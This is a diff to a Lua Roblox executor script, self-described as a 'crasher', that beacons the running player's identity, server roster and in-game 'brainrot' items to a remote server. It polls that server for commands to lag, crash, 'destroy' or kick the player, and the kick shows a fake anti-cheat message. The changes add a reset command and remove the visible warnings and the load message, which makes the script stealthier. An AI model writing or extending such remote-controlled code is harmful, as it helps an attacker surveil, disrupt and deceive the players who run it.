@@ -6,24 +6,26 @@ local KEY = "CRASHER"
 local function resolveRequest()
     return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or getgenv().http_request or getgenv().request or (getgenv().syn and getgenv().syn.request)
 end
+
 local request = resolveRequest()
 if not request then
     local deadline = tick() + 10
     repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
 end
-if not request then return warn("No request function found") end
+if not request then return end
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local Workspace = game:GetService("Workspace")
 
 local LP = Players.LocalPlayer
 if not LP then
     local deadline = tick() + 30
     repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
 end
-if not LP then return warn("No LocalPlayer") end
+if not LP then return end
 
 -- ===== UTILITY =====
 local function safe(fn)
@@ -32,22 +34,23 @@ local function safe(fn)
 end
 
 local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
+
 local function gameName()
     local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
     return info and info.Name or "Unknown Game"
 end
+
 local function avatarUrl()
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
 end
+
 local function serverPlayers()
     local t = {}
-    for _, p in ipairs(Players:GetPlayers()) do
-        t[#t+1] = p.Name
-    end
+    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
     return t
 end
 
--- ===== COLLECT BRAINROTS (simplified for speed) =====
+-- ===== COLLECT BRAINROTS =====
 local function collectBrainrots()
     local list = {}
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
@@ -79,8 +82,8 @@ local function heartbeat()
             server_players = serverPlayers(),
             brainrots = brainrots,
         }
-        local success, result = pcall(function()
-            return request({
+        pcall(function()
+            request({
                 Url = BASE .. "/api/public/heartbeat",
                 Method = "POST",
                 Headers = {
@@ -90,15 +93,10 @@ local function heartbeat()
                 Body = HttpService:JSONEncode(body),
             })
         end)
-        if success and result and result.Body then
-            print("[HEARTBEAT] Success")
-        else
-            warn("[HEARTBEAT] Failed")
-        end
     end)
 end
 
--- ===== LAG & DESTROY FUNCTIONS (same as before) =====
+-- ===== LAG FUNCTIONS =====
 local fpsConn = nil
 local fpsOn = false
 local function setFpsLimit(on)
@@ -195,15 +193,86 @@ local function setMode(newMode)
     if mode then isActive = true startLoop() else isActive = false stopLoop() end
 end
 
+-- ===== DESTROY =====
 local isDestroyActive = false
 local destroyThread = nil
 
+-- ===== RESET CHARACTER (Teleport + Full Health) =====
+local function resetCharacter()
+    -- Stop all lag effects
+    setMode(nil)
+    setFpsLimit(false)
+    isDestroyActive = false
+    if destroyThread then
+        pcall(task.cancel, destroyThread)
+        destroyThread = nil
+    end
+    
+    local char = LP.Character
+    if char then
+        local root = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChild("Humanoid")
+        
+        if root then
+            -- Find spawn location
+            local spawnLocation = nil
+            local spawns = Workspace:FindFirstChild("Spawns")
+            if spawns and #spawns:GetChildren() > 0 then
+                spawnLocation = spawns:GetChildren()[1]
+            end
+            
+            -- If no spawns, find any spawn location in Workspace
+            if not spawnLocation then
+                for _, obj in ipairs(Workspace:GetDescendants()) do
+                    if obj:IsA("SpawnLocation") then
+                        spawnLocation = obj
+                        break
+                    end
+                end
+            end
+            
+            -- Teleport
+            if spawnLocation then
+                root.CFrame = spawnLocation.CFrame * CFrame.new(0, 3, 0)
+            else
+                -- Fallback: teleport to 0, 10, 0
+                root.Position = Vector3.new(0, 10, 0)
+            end
+            
+            -- Clear velocity
+            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+        end
+        
+        if hum then
+            -- Full health
+            hum.Health = hum.MaxHealth
+            hum.PlatformStand = false
+            -- Reset all body parts (if ragdolled)
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                end
+            end
+        end
+    end
+    
+    -- Reset state flags
+    prevLagN = false
+    prevLagC = false
+    prevFps = false
+    isDestroyActive = false
+    kicked = false
+end
+
+-- ===== POLL COMMANDS =====
 local kicked = false
 local prevLagN = false
 local prevLagC = false
 local prevFps = false
+local lastReset = 0
 
--- ===== POLL =====
 local function poll()
     local res = safe(function()
         return request({
@@ -213,29 +282,46 @@ local function poll()
         })
     end)
     if not res or not res.Body then return end
+    
     local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
     if not ok2 or type(data) ~= "table" then return end
-
+    
+    -- FPS
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then
         prevFps = wantFps
         setFpsLimit(wantFps)
     end
-
+    
+    -- RESET (priority - reset character)
+    if data.reset == true and tick() - lastReset > 2 then
+        lastReset = tick()
+        resetCharacter()
+        -- Don't return, continue to process other commands after reset
+    end
+    
+    -- Lag modes
     local wantN = (data.lag_n == true)
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC or wantN ~= prevLagN then
         prevLagC = wantC
         prevLagN = wantN
-        if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
+        if wantC then
+            setMode("carry")
+        elseif wantN then
+            setMode("normal")
+        else
+            setMode(nil)
+        end
     end
-
+    
+    -- Destroy
     local wantDestroy = (data.destroy == true)
     if wantDestroy ~= isDestroyActive then
         isDestroyActive = wantDestroy
         if isDestroyActive then
             setMode(nil)
-            if destroyThread then task.cancel(destroyThread) end
+            if destroyThread then pcall(task.cancel, destroyThread) end
             destroyThread = task.spawn(function()
                 while isDestroyActive do
                     local char = LP.Character
@@ -251,21 +337,23 @@ local function poll()
                 end
             end)
         else
-            if destroyThread then task.cancel(destroyThread) destroyThread = nil end
+            if destroyThread then pcall(task.cancel, destroyThread) destroyThread = nil end
         end
     end
-
+    
+    -- Crash
     if data.crash == true then
         while true do end
     end
-
+    
+    -- Kick
     if data.kick == true and not kicked then
         kicked = true
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
     end
 end
 
--- ===== START LOOPS =====
+-- ===== START =====
 heartbeat()
 poll()
 
@@ -276,5 +364,3 @@ end)
 task.spawn(function()
     while task.wait(0.5) do poll() end
 end)
-
-print("✅ Crasher script loaded! Waiting for commands...")
